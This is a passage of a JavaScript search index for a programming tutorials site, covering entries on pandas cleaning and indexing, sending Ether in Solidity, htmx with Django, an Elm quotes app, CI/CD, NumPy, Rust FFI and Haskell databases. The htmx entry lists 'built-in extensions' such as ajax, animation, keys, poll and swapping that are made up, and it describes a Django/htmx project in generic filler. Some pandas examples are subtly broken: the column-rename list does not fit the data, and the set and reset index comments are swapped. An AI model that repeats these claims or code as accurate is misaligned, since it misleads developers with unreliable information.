                description: "This section will focus on data cleaning, a pre-processing technique use in Machine Learning.",
                content: "Cleaning Data Using Pandas linkData cleaning is one of the most common tasks in data science. Pandas lets you preprocess data for various uses, including training machine learning and deep learning models. Let’s use the DataFrame df2 from earlier, having four missing values, to illustrate a few data cleaning use cases. As a reminder, here’s how you can see how many missing values are in a DataFrame.\ndf2.isnull().sum() Pregnancies 4 Glucose 0 BloodPressure 0 SkinThickness 0 Insulin 0 BMI 0 DiabetesPedigreeFunction 0 Age 0 Outcome 0 dtype: int64 Dealing with Missing Data Technique #1: Dropping Missing Values linkOne way to deal with missing data is to drop it. This is useful when you have plenty of data and losing a small portion won’t impact the downstream analysis. You can use the .dropna() method as shown below. Here, we are saving the results from .dropna() into a DataFrame df3.\ndf3 = df2.copy() df3 = df3.dropna() df3.shape (764, 9) # this is 4 rows less than df2 The axis argument lets you specify whether you are dropping rows or columns with missing values. The default axis removes the rows containing NaNs. Use axis=1 to remove the columns with one or more NaN values. Also, notice how we are using the argument inplace=True which lets you skip saving the output of .dropna() into a new DataFrame.\ndf3 = df2.copy() df3.dropna(inplace=True, axis=1) df3.head() Dropping missing data in pandas\nYou can also drop both rows and columns with missing values by setting the how argument to ‘all’.\ndf3 = df2.copy() df3.dropna(inplace=True, how='all') Dealing with Missing Data Technique #2: Replacing Missing Values linkInstead of dropping, replacing missing values with a summary statistic or a specific value (depending on the use case) may be the best approach. For example, if there is one missing row from a temperature column denoting temperatures throughout the days of the week, replacing that missing value with the average temperature of that week may be more effective than dropping values completely. You can replace the missing data with the row or column mean using the code below.\ndf3 = df2.copy() # Get the mean of Pregnancies mean_value = df3['Pregnancies'].mean() # Fill missing values using .fillna() df3 = df3.fillna(mean_value) Dealing with Duplicate Data linkLet’s add some duplicates to the original data to learn how to eliminate duplicates in a DataFrame. Here, we are using the .concat() method to concatenate the rows of the df2 DataFrame to the df2 DataFrame, adding perfect duplicates of every row in df2.\ndf3 = pd.concat([df2, df2]) df3.shape (1536, 9) You can remove all duplicate rows (default) from the DataFrame using the .drop_duplicates() method.\ndf3 = df3.drop_duplicates() df3.shape (768, 9) Renaming Columns linkA common data cleaning task is renaming columns. With the .rename() method, you can use columns as an argument to rename specific columns. The below code shows the dictionary for mapping old and new column names.\ndf3.rename(columns={'DiabetesPedigreeFunction': 'DPF'}, inplace=True) df3.head() Renaming columns in pandas\nYou can also directly assign column names as a list to the DataFrame.\ndf3.columns = ['Glucose', 'BloodPressure', 'SkinThickness', 'Insulin', 'BMI', 'DPF', 'Age', 'Outcome', 'STF'] df3.head() Renaming columns in pandas\nFor more on data cleaning, and for easier, more predictable data cleaning workflows, check out the following checklist, which provides you with a comprehensive set of common data cleaning tasks.\nData Analysis in Pandas linkThe main value proposition of pandas lies in its quick data analysis functionality. In this section, we’ll focus on a set of analysis techniques you can use in pandas.\nSummary Operators (Mean, Mode, Median) linkAs you saw earlier, you can get the mean of each column value using the .mean() method.\ndf.mean() Printing the mean of columns in pandas\nA mode can be computed similarly using the .mode() method.\ndf.mode() Printing the mode of columns in pandas\nSimilarly, the median of each column is computed with the .median() method.\ndf.median() Printing the median of columns in pandas\nCreate New Columns Based on Existing Columns linkPandas provides fast and efficient computation by combining two or more columns like scalar variables. The below code divides each value in the column Glucose by the corresponding value in the Insulin column to compute a new column named Glucose_Insulin_Ratio.\ndf2['Glucose_Insulin_Ratio'] = df2['Glucose'] / df2['Insulin'] df2.head() Create a new column from existing columns in pandas\nCounting Using .value_counts() linkOften, you’ll work with categorical values, and you’ll want to count the number of observations each category has in a column. Category values can be counted using the .value_counts() method. Here, for example, we are counting the number of observations where Outcome is diabetic (1) and the number of observations where the Outcome is non-diabetic (0).\ndf['Outcome'].value_counts() Using .value_counts() in pandas\nAdding the normalize argument returns proportions instead of absolute counts.\ndf['Outcome'].value_counts(normalize=True) Using .value_counts() in pandas with normalization\nTurn off automatic sorting of results using the sort argument (True by default). The default sorting is based on the counts in descending order.\ndf['Outcome'].value_counts(sort=False) Using .value_counts() in pandas with sorting\nYou can also apply .value_counts() to a DataFrame object and specific columns within it instead of just a column. Here, for example, we are applying value_counts() on df with the subset argument, which takes in a list of columns.\ndf.value_counts(subset=['Pregnancies', 'Outcome']) Using .value_counts() in pandas while subsetting columns\nAggregating Data with .groupby() in Pandas linkPandas lets you aggregate values by grouping them by specific column values. You can do that by combining the .groupby() method with a summary method of your choice. The below code displays the mean of each of the numeric columns grouped by Outcome.\ndf.groupby('Outcome').mean() Aggregating data by one column in pandas\n.groupby() enables grouping by more than one column by passing a list of column names, as shown below.\ndf.groupby(['Pregnancies', 'Outcome']).mean() Aggregating data by two columns in pandas\nAny summary method can be used alongside .groupby(), including .min(), .max(), .mean(), .median(), .sum(), .mode(), and more.\nPivot Tables linkPandas also enables you to calculate summary statistics as pivot tables. This makes it easy to draw conclusions based on a combination of variables. The below code picks the rows as unique values of Pregnancies, the column values as the unique values of Outcome, and the cells contain the average value of BMI in the corresponding group.\nFor example, for Pregnancies = 5 and Outcome = 0, the average BMI turns out to be 31.1.\npd.pivot_table(df, values=\"BMI\", index='Pregnancies', columns=['Outcome'], aggfunc=np.mean) Aggregating data by pivoting with pandas\nData Visualization in Pandas linkPandas provides convenience wrappers to Matplotlib plotting functions to make it easy to visualize your DataFrames. Below, you’ll see how to do common data visualizations using pandas.\nLine Plots in Pandas linkPandas enables you to chart out the relationships among variables using line plots. Below is a line plot of BMI and Glucose versus the row index.\ndf[['BMI', 'Glucose']].plot.line() Basic line plot with pandas\nYou can select the choice of colors by using the color argument.\ndf[['BMI', 'Glucose']].plot.line(figsize=(20, 10), color={\"BMI\": \"red\", \"Glucose\": \"blue\"}) Basic line plot with pandas, with custom colors\nAll the columns of df can also be plotted on different scales and axes by using the subplots argument.\ndf.plot.line(subplots=True) Subplots for line plots with pandas\nBar Plots in Pandas linkFor discrete columns, you can use a bar plot over the category counts to visualize their distribution. The\n"
            }
        );
    index.add(
            {
                id:  132 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/sending_and_recieving_ether\/",
                title: "How to Send and Receive Ether in Solidity",
                description: "A simple guide on how to send and receive ether in solidity.",
                content: "Sending and receiving Ether in Solidity involves understanding the different methods available and their respective use cases. This guide will cover how to send Ether using transfer, send, and call, how to receive Ether, and which method to use for optimal security.\nSending Ether linktransfer linkThe transfer method sends 2300 gas and throws an error if the transfer fails.\nfunction sendViaTransfer(address payable _to) public payable { // This function is no longer recommended for sending Ether. _to.transfer(msg.value); } send linkThe send method also sends 2300 gas but returns a boolean indicating success or failure.\nfunction sendViaSend(address payable _to) public payable { // Send returns a boolean value indicating success or failure. // This function is not recommended for sending Ether. bool sent = _to.send(msg.value); require(sent, \"Failed to send Ether\"); } call linkThe call method forwards all gas or sets a specified amount and returns a boolean indicating success or failure. This is the recommended method.\nfunction sendViaCall(address payable _to) public payable { // Call returns a boolean value indicating success or failure. // This is the current recommended method to use. (bool sent, bytes memory data) = _to.call{value: msg.value}(\"\"); require(sent, \"Failed to send Ether\"); } Receiving Ether linkA contract that receives Ether must implement at least one of the following functions:\nreceive() external payable fallback() external payable The receive() function is called if msg.data is empty, otherwise, the fallback() function is called.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.24; contract ReceiveEther { // Function to receive Ether. msg.data must be empty receive() external payable {} // Fallback function is called when msg.data is not empty fallback() external payable {} function getBalance() public view returns (uint256) { return address(this).balance; } } Which Method Should You Use? linkAs of December 2019, using call in combination with a re-entrancy guard is the recommended method for sending Ether.\nTo guard against re-entrancy attacks:\nMake all state changes before calling other contracts. Use a re-entrancy guard modifier. We have a topic about reentrancy attacks and you can read more about it.\nExample with re-entrancy guard:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.24; import {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\"; contract SendEther is ReentrancyGuard { function sendViaCall(address payable _to) public payable nonReentrant { // Call returns a boolean value indicating success or failure. (bool sent, bytes memory data) = _to.call{value: msg.value}(\"\"); require(sent, \"Failed to send Ether\"); } } Example Contracts linkReceiveEther Contract\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.24; contract ReceiveEther { // Function to receive Ether. msg.data must be empty receive() external payable {} // Fallback function is called when msg.data is not empty fallback() external payable {} function getBalance() public view returns (uint256) { return address(this).balance; } } SendEther Contract\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.24; contract SendEther { function sendViaTransfer(address payable _to) public payable { // This function is no longer recommended for sending Ether. _to.transfer(msg.value); } function sendViaSend(address payable _to) public payable { // Send returns a boolean value indicating success or failure. // This function is not recommended for sending Ether. bool sent = _to.send(msg.value); require(sent, \"Failed to send Ether\"); } function sendViaCall(address payable _to) public payable { // Call returns a boolean value indicating success or failure. // This is the current recommended method to use. (bool sent, bytes memory data) = _to.call{value: msg.value}(\"\"); require(sent, \"Failed to send Ether\"); } } By following these guidelines and using the recommended methods, you can securely send and receive Ether in your Solidity smart contracts, ensuring robust and secure transactions.\n"
            }
        );
    index.add(
            {
                id:  133 ,
                href: "\/tutorials\/docs\/htmx\/",
                title: "HTMX",
                description: "htmx is a library that allows you to access modern browser features directly from HTML, rather than using javascript.",
                content: ""
            }
        );
    index.add(
            {
                id:  134 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/some_examples_using_htmx\/",
                title: "htmx usage with Django",
                description: "Learn about what HTMX is and how you can use it.",
                content: "There is an open-source Django/htmx project. The main aim is to show how htmx could be used in a modern, high-performance Django project. There is a lot of scope for optimization, and with Django being a highly optimized framework with a lot of built-in tools, it should be possible to produce high-quality applications without a lot of custom code. The project is based on the Django REST Framework, with a few extensions and libraries to make development easier.\nThe Django/htmx project is built using Django 1.11, and Python 3.6. The code is available on GitHub, and the project is licensed under the MIT license.\nThe project is organized into a number of apps, each of which contains a number of models, views, templates, and static files. The apps are:\ncore: The core app contains the main models, views, templates, and static files for the project. It also contains the main URLs for the project, and the settings for the project. blog: The blog app contains the models, views, templates, and static files for the blog. accounts: The accounts app contains the models, views, templates, and static files for the accounts. api: The api app contains the models, views, templates, and static files for the API. htmx: The htmx app contains the models, views, templates, and static files for the htmx examples. webpack: The webpack app contains the models, views, templates, and static files for the webpack examples. Each app has its own URLs, and the main URLs for the project are defined in the core app. The core app also contains the settings for the project, and the main URLs for the project.\nExtending htmx with Javascript linkhtmx allows you to write custom extension to add behavior that isn’t natively supported in the library. You can do this using the htmx.defineExtension method. Here’s an example of a simple extension that will log all htmx requests to the console:\nhtmx.defineExtension('logger', { onEvent: function(name, evt) { if (name === 'htmx:beforeRequest') { console.log('Requesting URL: ', evt.detail.path); } } }); You can then enable this extension using the hx-ext attribute:\nClick Me! This will log the URL of every request made by htmx.\nBuilt-in htmx Extensions linkhtmx comes with a few built-in extensions that add additional behavior. Here are some of the built-in extensions:\najax: This extension adds support for making AJAX requests. animation: This extension adds support for animating elements when they are swapped. csrf: This extension adds support for including a CSRF token in all requests. history: This extension adds support for pushing URLs to the history stack. intercept: This extension adds support for intercepting and modifying requests and responses. json: This extension adds support for processing JSON responses. keys: This extension adds support for handling keyboard events. method: This extension adds support for changing the HTTP method of a request. oob: This extension adds support for out-of-band (OOB) swaps. poll: This extension adds support for polling endpoints. push-url: This extension adds support for pushing URLs to the history stack. sse: This extension adds support for Server-Sent Events. swapping: This extension adds support for swapping elements. ws: This extension adds support for WebSockets. Conclusion linkhtmx is a powerful library that enables a new way of thinking about web applications, leveraging the power of hypertext to build rich, interactive user interfaces without the complexity of modern JavaScript frameworks. By using htmx, you can create applications that are simpler, more maintainable, and more performant.\n"
            }
        );
    index.add(
            {
                id:  135 ,
                href: "\/tutorials\/docs\/elm\/elm\/random_quote_generator\/",
                title: "huCreating a Random Quotes App in Elm",
                description: "Handling HTTP requests and JSON data in Elm.",
                content: "In this tutorial, we will walk through building a simple Elm application that fetches random quotes from an API. We will break down the code into logical sections and explain each part in detail. By the end of this tutorial, you will have a good understanding of how to make HTTP requests and handle the responses in Elm.\nIntroduction linkElm is a functional language for building reliable web applications. This tutorial will guide you through creating an application that fetches random quotes and displays them. You can find more information about handling JSON and HTTP in Elm in the official guide.\nThe Complete Code linkHere’s the full code for the application. We’ll break it down into sections and explain each part.\n-- Press a button to send a GET request for random quotes. -- -- Read how it works: -- https://guide.elm-lang.org/effects/json.html -- import Browser import Html exposing (..) import Html.Attributes exposing (style) import Html.Events exposing (..) import Http import Json.Decode exposing (Decoder, map4, field, int, string) Main Function linkThe main function is the entry point of our Elm application. It initializes the application with Browser.element and sets up the init, update, subscriptions, and view functions.\nmain = Browser.element { init = init , update = update , subscriptions = subscriptions , view = view } Model linkThe Model represents the state of our application. We define a custom type Model with three possible states: Failure, Loading, and Success with a Quote.\ntype Model = Failure | Loading | Success Quote type alias Quote = { quote : String , source : String , author : String , year : Int } Initialization linkThe init function initializes the application state. We start with the Loading state and immediately fetch a random quote.\ninit : () -\u003e (Model, Cmd Msg) init _ = (Loading, getRandomQuote) Update linkThe update function handles messages and updates the model accordingly. We define two message types: MorePlease and GotQuote.\ntype Msg = MorePlease | GotQuote (Result Http.Error Quote) update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of MorePlease -\u003e (Loading, getRandomQuote) GotQuote result -\u003e case result of Ok quote -\u003e (Success quote, Cmd.none) Err _ -\u003e (Failure, Cmd.none) Subscriptions linkThe subscriptions function manages subscriptions to external events. In this application, we don’t have any subscriptions.\nsubscriptions : Model -\u003e Sub Msg subscriptions model = Sub.none View linkThe view function renders the HTML based on the current model state. It uses a helper function viewQuote to display the quote or relevant messages.\nview : Model -\u003e Html Msg view model = div [] [ h2 [] [ text \"Random Quotes\" ] , viewQuote model ] viewQuote : Model -\u003e Html Msg viewQuote model = case model of Failure -\u003e div [] [ text \"I could not load a random quote for some reason. \" , button [ onClick MorePlease ] [ text \"Try Again!\" ] ] Loading -\u003e text \"Loading...\" Success quote -\u003e div [] [ button [ onClick MorePlease, style \"display\" \"block\" ] [ text \"More Please!\" ] , blockquote [] [ text quote.quote ] , p [ style \"text-align\" \"right\" ] [ text \"— \" , cite [] [ text quote.source ] , text (\" by \" ++ quote.author ++ \" (\" ++ String.fromInt quote.year ++ \")\") ] ] HTTP Request linkThe getRandomQuote function sends an HTTP GET request to fetch a random quote. It uses a decoder to parse the JSON response into a Quote.\ngetRandomQuote : Cmd Msg getRandomQuote = Http.get { url = \"https://elm-lang.org/api/random-quotes\" , expect = Http.expectJson GotQuote quoteDecoder } quoteDecoder : Decoder Quote quoteDecoder = map4 Quote (field \"quote\" string) (field \"source\" string) (field \"author\" string) (field \"year\" int) Conclusion linkThis tutorial covered the essential parts of an Elm application that fetches and displays random quotes. You learned about the main structure of an Elm app, how to define a model, handle updates, manage subscriptions, and make HTTP requests.\nFeel free to modify the code and experiment with different features to deepen your understanding of Elm. Happy coding!\n"
            }
        );
    index.add(
            {
                id:  136 ,
                href: "\/tutorials\/docs\/huff\/",
                title: "huff",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: ""
            }
        );
    index.add(
            {
                id:  137 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/ci_cd\/",
                title: "Implementing CI/CD Pipelines for Seamless Deployment",
                description: "Continuous Integration and Continuous Deployment (CI/CD) are pivotal practices in modern software development, enabling teams to deliver code changes more frequently and reliably. CI/CD pipelines automate the process of code integration, testing, and deployment, fostering a culture of continuous improvement and rapid delivery. This post will discuss the importance of CI/CD in technical architecture and provide a step-by-step guide to setting up and maintaining CI/CD pipelines.\nBenefits of CI/CD link1. Accelerated Development linkCI/CD pipelines enable developers to integrate and deploy code changes quickly and efficiently.",
                content: "Continuous Integration and Continuous Deployment (CI/CD) are pivotal practices in modern software development, enabling teams to deliver code changes more frequently and reliably. CI/CD pipelines automate the process of code integration, testing, and deployment, fostering a culture of continuous improvement and rapid delivery. This post will discuss the importance of CI/CD in technical architecture and provide a step-by-step guide to setting up and maintaining CI/CD pipelines.\nBenefits of CI/CD link1. Accelerated Development linkCI/CD pipelines enable developers to integrate and deploy code changes quickly and efficiently. This reduces the time to market for new features and bug fixes, allowing organizations to respond swiftly to customer needs and market demands.\n2. Improved Code Quality linkAutomated testing within CI/CD pipelines ensures that code changes are thoroughly tested before deployment. This reduces the likelihood of introducing bugs into the production environment and maintains a high standard of code quality.\n3. Enhanced Collaboration linkCI/CD fosters a collaborative environment where developers can frequently integrate their code changes into a shared repository. This reduces integration conflicts and encourages teamwork, as code changes are continually reviewed and tested.\n4. Increased Deployment Frequency linkWith automated pipelines, deployments become routine and less risky. This encourages smaller, incremental releases rather than large, infrequent updates, which reduces the risk of significant failures and makes it easier to identify and fix issues.\n5. Reduced Manual Errors linkAutomation minimizes the risk of human error in the integration, testing, and deployment processes. This ensures consistency and reliability in the software delivery lifecycle.\nStep-by-Step Guide to Setting Up CI/CD Pipelines linkStep 1: Assess Your Requirements linkBefore setting up a CI/CD pipeline, assess your project’s specific requirements:\nProject Size and Complexity: Consider the scale of your application and the complexity of its components. Technology Stack: Identify the languages, frameworks, and tools your project utilizes. Team Expertise: Evaluate your team’s familiarity with CI/CD practices and tools. Step 2: Choose CI/CD Tools linkSelect tools that fit your project’s requirements. Popular CI/CD tools include:\nJenkins: Open-source automation server with extensive plugin support. GitLab CI/CD: Integrated CI/CD solution within the GitLab platform. CircleCI: Cloud-based CI/CD service with robust automation capabilities. Travis CI: Continuous integration service that integrates with GitHub. Step 3: Set Up Version Control linkEnsure that your codebase is stored in a version control system (VCS) like Git. Version control is essential for tracking changes, collaborating with team members, and integrating CI/CD tools.\nStep 4: Configure Continuous Integration (CI) link1. Create a CI Configuration File linkMost CI tools use configuration files (e.g., .jenkinsfile, .gitlab-ci.yml, .circleci/config.yml) to define the CI pipeline. This file specifies the steps for building and testing the application.\nExample for a Node.js application using GitLab CI:\nstages: - build - test build: stage: build script: - npm install - npm run build test: stage: test script: - npm test 2. Integrate with VCS linkConnect your CI tool to your VCS repository. This typically involves setting up webhooks to trigger the CI pipeline on code changes (e.g., commits, pull requests).\n3. Set Up Automated Testing linkDefine tests that the CI pipeline will run automatically. This ensures that code changes do not introduce new issues.\nStep 5: Configure Continuous Deployment (CD) link1. Define Deployment Steps linkExtend your CI configuration file to include deployment steps. Specify the environments (e.g., staging, production) and the actions required to deploy the application.\nExample for deploying to AWS using GitLab CI:\ndeploy: stage: deploy script: - aws s3 sync ./build s3://my-bucket - aws cloudfront create-invalidation --distribution-id my-distribution-id --paths \"/*\" environment: name: production url: http://my-website.com only: - master 2. Automate Deployments linkEnsure that deployments are automated and triggered by successful CI pipeline runs. This can involve using tools like Docker for containerization and Kubernetes for orchestration.\nStep 6: Monitor and Optimize link1. Implement Monitoring linkUse monitoring tools like Prometheus, Grafana, and ELK Stack (Elasticsearch, Logstash, Kibana) to track the performance and health of your CI/CD pipeline. Monitor build times, test results, and deployment status.\n2. Continuously Improve linkRegularly review pipeline performance and identify bottlenecks. Optimize steps to reduce build and deployment times. Encourage feedback from the development team to improve the CI/CD process.\nTools and Best Practices for Maintaining CI/CD linkTools link Jenkins: Highly customizable with a vast plugin ecosystem. Ideal for complex CI/CD workflows. GitLab CI/CD: Integrated with GitLab, providing a seamless experience from code management to deployment. CircleCI: Known for its speed and scalability. Excellent for cloud-native applications. Travis CI: Simplifies CI/CD for open-source projects, tightly integrated with GitHub. Best Practices link Commit Frequently: Encourage developers to commit code changes frequently. Smaller commits are easier to test and deploy. Automate Everything: Automate all aspects of the pipeline, including build, test, and deployment processes. Keep Pipelines Fast: Optimize pipeline steps to reduce build and deployment times. Use caching and parallelism where possible. Use Feature Flags: Implement feature flags to control the release of new features. This allows for safer deployments and easier rollbacks. Ensure Security: Incorporate security checks and vulnerability scanning into the pipeline. Tools like Snyk and OWASP Dependency-Check can help. Documentation and Training: Maintain comprehensive documentation of your CI/CD pipelines and provide training to the development team. Conclusion linkImplementing CI/CD pipelines is essential for modern software development, enabling rapid, reliable, and automated code integration and deployment. By following the steps outlined in this guide and leveraging the right tools and best practices, you can set up and maintain effective CI/CD pipelines that enhance your development workflow, improve code quality, and accelerate time to market. Embrace CI/CD to transform your development process and achieve seamless deployment.\n"
            }
        );
    index.add(
            {
                id:  138 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/indexing_and_selection_of_data\/",
                title: "Indexing and Selection of Data in Pandas",
                description: "...",
                content: "Efficiently selecting and manipulating data is a core aspect of data analysis. Pandas provides a powerful suite of indexing and selection tools to facilitate this. Let’s explore these capabilities in depth, focusing on the Series and DataFrame data structures.\nIndexing and Selection in Series linkA Series in Pandas is a one-dimensional array with labels, which can be used for efficient indexing and selection.\nBasic Indexing linkYou can access elements in a Series using integer-based and label-based indexing.\nimport pandas as pd # Creating a Series s = pd.Series([10, 20, 30, 40], index=['a', 'b', 'c', 'd']) # Integer-based indexing print(s[0]) # Output: 10 # Label-based indexing print(s['a']) # Output: 10 Slicing linkSlicing allows you to select a range of elements.\n# Integer-based slicing print(s[1:3]) # Output: b 20, c 30 # Label-based slicing print(s['b':'d']) # Output: b 20, c 30, d 40 Boolean Indexing linkYou can use boolean indexing to filter elements based on conditions.\nprint(s[s \u003e 20]) # Output: c 30, d 40 Fancy Indexing linkFancy indexing involves passing a list of labels or integers to select multiple elements.\nprint(s[['a', 'c', 'd']]) # Output: a 10, c 30, d 40 Indexing and Selection in DataFrame linkA DataFrame in Pandas is a two-dimensional, labeled data structure, similar to a table in a relational database or a spreadsheet.\nSelecting Columns linkYou can select columns in a DataFrame using label-based indexing.\n# Creating a DataFrame df = pd.DataFrame({ 'A': [1, 2, 3], 'B': [4, 5, 6], 'C': [7, 8, 9] }) # Selecting a single column print(df['A']) # Output: 0 1, 1 2, 2 3 # Selecting multiple columns print(df[['A', 'C']]) # Output: # A C # 0 1 7 # 1 2 8 # 2 3 9 Selecting Rows linkYou can select rows using label-based indexing with loc or integer-based indexing with iloc.\n# Label-based indexing print(df.loc[1]) # Output: A 2, B 5, C 8 # Integer-based indexing print(df.iloc[1]) # Output: A 2, B 5, C 8 Slicing linkSlicing can be performed on both rows and columns.\n# Slicing rows print(df[1:3]) # Output: # A B C # 1 2 5 8 # 2 3 6 9 # Slicing rows and columns print(df.loc[1:3, 'A':'B']) # Output: # A B # 1 2 5 # 2 3 6 Boolean Indexing linkBoolean indexing can be used to filter rows based on column values.\nprint(df[df['A'] \u003e 1]) # Output: # A B C # 1 2 5 8 # 2 3 6 9 Fancy Indexing linkFancy indexing allows selection of specific rows and columns by passing lists of indices.\n# Selecting specific rows print(df.iloc[[0, 2]]) # Output: # A B C # 0 1 4 7 # 2 3 6 9 # Selecting specific columns print(df[['A', 'C']]) # Output: # A C # 0 1 7 # 1 2 8 # 2 3 9 Advanced Indexing and Selection linkMultiIndex linkPandas supports hierarchical indexing, which allows you to work with higher-dimensional data in a lower-dimensional data structure.\n# Creating a MultiIndex DataFrame index = pd.MultiIndex.from_tuples([('A', 1), ('A', 2), ('B', 1), ('B', 2)]) df = pd.DataFrame({ 'Value': [10, 20, 30, 40] }, index=index) print(df) # Output: # Value # A 1 10 # 2 20 # B 1 30 # 2 40 # Selecting data from MultiIndex print(df.loc['A']) # Output: # Value # 1 10 # 2 20 Setting and Resetting Index linkYou can set a column as an index and reset it back to a column.\n# Setting an index df = df.reset_index() print(df) # Output: # level_0 level_1 Value # 0 A 1 10 # 1 A 2 20 # 2 B 1 30 # 3 B 2 40 # Resetting the index df = df.set_index(['level_0', 'level_1']) print(df) # Output: # Value # level_0 level_1 # A 1 10 # 2 20 # B 1 30 # 2 40 Conclusion linkPandas offers a comprehensive set of tools for indexing and selecting data, allowing for both simple and complex operations. Whether you’re working with one-dimensional Series or multi-dimensional DataFrame objects, Pandas provides intuitive and powerful methods to access and manipulate your data efficiently.\n"
            }
        );
    index.add(
            {
                id:  139 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/indexing_and_slicing_in_numpy\/",
                title: "Indexing and Slicing In Numpy",
                description: "...",
                content: "Indexing and Slicing in NumPy linkOverview linkIndexing and slicing are fundamental operations for accessing and manipulating elements in NumPy arrays. Understanding how to efficiently select and extract elements from arrays is essential for working with data effectively in NumPy.\nBasic Indexing linkNumPy arrays support similar indexing syntax to Python lists. You can access individual elements of an array using square brackets and indices.\nimport numpy as np # Create an array arr = np.array([1, 2, 3, 4, 5]) # Access individual elements print(\"First element:\", arr[0]) print(\"Last element:\", arr[-1]) Slicing linkSlicing allows you to extract a subset of elements from an array based on specified start, stop, and step parameters.\nimport numpy as np # Create an array arr = np.array([1, 2, 3, 4, 5]) # Slice elements print(\"First three elements:\", arr[:3]) print(\"Elements from index 1 to 3:\", arr[1:4]) print(\"Every other element:\", arr[::2]) Multi-dimensional Arrays linkFor multi-dimensional arrays, indexing and slicing work similarly, with additional indices for each dimension separated by commas.\nimport numpy as np # Create a 2D array arr_2d = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) # Access individual elements print(\"Element at row 1, column 2:\", arr_2d[0, 1]) # Slice rows and columns print(\"First row:\", arr_2d[0]) print(\"First column:\", arr_2d[:, 0]) print(\"Subarray from row 1 to 2, column 1 to 2:\\n\", arr_2d[1:3, 0:2]) Boolean Indexing linkBoolean indexing allows you to filter elements in an array based on a boolean condition.\nimport numpy as np # Create an array arr = np.array([1, 2, 3, 4, 5]) # Boolean condition condition = arr \u003e 3 # Select elements based on condition print(\"Elements greater than 3:\", arr[condition]) Conclusion linkIndexing and slicing are powerful techniques for accessing and manipulating data in NumPy arrays. By mastering these operations, you can efficiently extract subsets of data, perform complex transformations, and filter elements based on specific criteria. Understanding how to effectively use indexing and slicing is essential for working with multidimensional data arrays in scientific computing, data analysis, and machine learning applications.\n"
            }
        );
    index.add(
            {
                id:  140 ,
                href: "\/tutorials\/docs\/rust\/rust\/integrating_rust_ffi_safe_abstractions\/",
                title: "Integrating Rust with Other Languages: FFI and Safe Abstractions",
                description: "Explore the essentials of integrating Rust with other programming languages through the Foreign Function Interface (FFI). This comprehensive guide covers how to call C functions from Rust and how to build safe abstractions over inherently unsafe code, providing technical insights, practical coding examples, and best practices for interoperability and safety.",
                content: "Introduction linkInterfacing Rust with other languages is a powerful feature that enables developers to reuse existing libraries and perform tasks that might be cumbersome or impossible in pure Rust. This post focuses on Rust’s capabilities to interact with C using FFI and discusses strategies for maintaining safety despite the inherent risks of working with unsafe code.\nFFI Basics: Calling C from Rust linkRust’s FFI is a way to interface with the C language. It allows Rust code to call C libraries and functions, which is useful for leveraging existing C codebases or using system libraries that are only accessible via C.\nHow to Call C from Rust:\nDefining External Functions:\nextern \"C\" { fn c_function(arg1: i32) -\u003e i32; } fn main() { unsafe { let result = c_function(5); println!(\"The result is {}\", result); } } This snippet demonstrates defining and calling a simple C function from Rust. The extern \"C\" block declares that the linked functions follow C’s calling convention.\nLinking to C Libraries:\nEnsure that Rust knows how to link to the C library using the build.rs script or specifying link attributes. For dynamic linking, make sure the C library is available on your system path or specify its location manually. Example build.rs for Linking:\nfn main() { println!(\"cargo:rustc-link-lib=c_library_name\"); } Creating Safe Abstractions Over Unsafe Code linkWhile FFI allows Rust to call C code, such interactions are inherently unsafe. To mitigate this, Rust developers often wrap unsafe C interactions in safe Rust abstractions.\nGuidelines for Safe Abstractions:\nEncapsulate Unsafe Code: Encapsulate all unsafe interactions with C within a dedicated module or API. Provide safe interfaces that external code can use without directly dealing with unsafe blocks. Error Handling: Convert C error patterns into Rust Result types, handling null pointers and error codes according to Rust’s safety guarantees. Resource Management: Use Rust’s ownership and borrowing rules to manage resources obtained from C. For example, wrapping a C resource in a Rust struct and implementing the Drop trait ensures proper resource cleanup. Example of a Safe Wrapper:\nstruct CResourceHandle(*mut c_void); impl CResourceHandle { pub fn new() -\u003e Result { let handle = unsafe { c_create_resource() }; if handle.is_null() { Err(String::from(\"Failed to create resource\")) } else { Ok(Self(handle)) } } pub unsafe fn do_something(\u0026self) -\u003e i32 { c_modify_resource(self.0) } } impl Drop for CResourceHandle { fn drop(\u0026mut self) { unsafe { c_free_resource(self.0); } } } This wrapper safely manages a C resource, providing methods that maintain Rust’s safety guarantees and ensuring proper cleanup through the Drop trait.\nConclusion linkIntegrating Rust with other languages via FFI opens up a vast array of possibilities but requires careful management to maintain Rust’s safety guarantees. By understanding how to call C functions and abstracting unsafe interactions behind safe APIs, Rust developers can safely leverage existing C codebases or system libraries.\n"
            }
        );
    index.add(
            {
                id:  141 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/interfacing-with-databases-in-haskell\/",
                title: "Interfacing Databases with Haskell",
                description: "Learn how to connect Haskell applications to databases and perform CRUD operations using SQLite and PostgreSQL. This guide provides practical examples to enhance your database management skills in Haskell.",
                content: "Introduction: linkIn this installment of our Haskell series, we delve into interfacing Haskell applications with databases—a critical skill for developing dynamic, data-driven applications. Haskell’s strong type system and functional programming paradigm provide unique advantages in database operations, ensuring safety and efficiency. We will explore how to connect to databases, perform CRUD (Create, Read, Update, Delete) operations, and provide practical examples using popular databases like SQLite and PostgreSQL.\nConnecting Haskell Applications to Databases linkOverview of Database Connectivity:\nConnecting to databases in Haskell typically involves using libraries that facilitate database interactions. These libraries often provide Haskell-friendly interfaces to SQL databases, abstracting much of the complexity involved in database communication.\nChoosing a Library: Libraries like persistent and opaleye offer robust frameworks for interfacing with SQL databases, providing both low-level SQL capabilities and high-level abstractions. Performing CRUD Operations Using Haskell linkUsing Haskell for Database Manipulations:\nOnce connected, performing CRUD operations is the next step. These operations allow you to create, retrieve, update, and delete data, interacting with the database effectively to manage application data.\nCreating Records: Using a library like persistent, you can define models and use them to insert records into your database seamlessly.\n{- Define a model -} share [mkPersist sqlSettings, mkMigrate \"migrateAll\"] [persist| Person name String age Int deriving Show |] {- Insert a new record -} 